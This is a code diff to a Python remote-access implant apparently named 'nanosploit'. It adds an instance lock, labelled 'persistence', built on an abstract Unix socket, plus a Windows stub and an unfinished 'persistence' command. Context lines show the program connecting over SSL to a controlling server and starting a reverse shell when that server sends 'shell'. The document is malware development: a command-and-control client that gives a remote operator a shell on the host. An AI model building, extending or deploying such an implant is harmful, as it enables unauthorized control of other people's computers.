@@ -2,6 +2,30 @@ import socket
 import ssl
 import subprocess
 import os
+import platform
+
+
+''' PERSISTENCE '''
+
+
+def persistence_linux() -> bool:
+    # First check for lock
+
+    # Without holding a reference to our socket somewhere it gets garbage collected when the function exits
+    persistence_linux.lock_socket = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+    try:
+        # The null byte (\0) means the socket is created in the abstract namespace instead of being created on the
+        # file system itself.
+        persistence_linux.lock_socket.bind('\0nanosploit')
+    except socket.error:
+        return True
+
+    print("Persistence OK")
+    return False
+
+
+def persistence_windows() -> bool:
+    return False
 
 
 ''' REVERSE SHELL '''
@@ -61,6 +85,17 @@ def init_connection() -> ssl.SSLSocket:
 
 
 def main():
+    # Persistence
+    already_running = False
+    if platform.system() == "Linux":
+        already_running = persistence_linux()
+    elif platform.system() == "Windows":
+        already_running = persistence_windows()
+
+    if already_running:
+        print("Already running, exiting...")
+        return
+
     ss = init_connection()
 
     # Handle server commands
@@ -72,6 +107,9 @@ def main():
                     ss.send(b"pong")
                 case b"shell":
                     reverse_shell(ss)
+                case b"persistence":
+                    # TODO: return persistence status
+                    pass
                 case _:
                     print(f"Unknown command received: '{buffer.decode()}'")
                     ss.send(b"unknown")
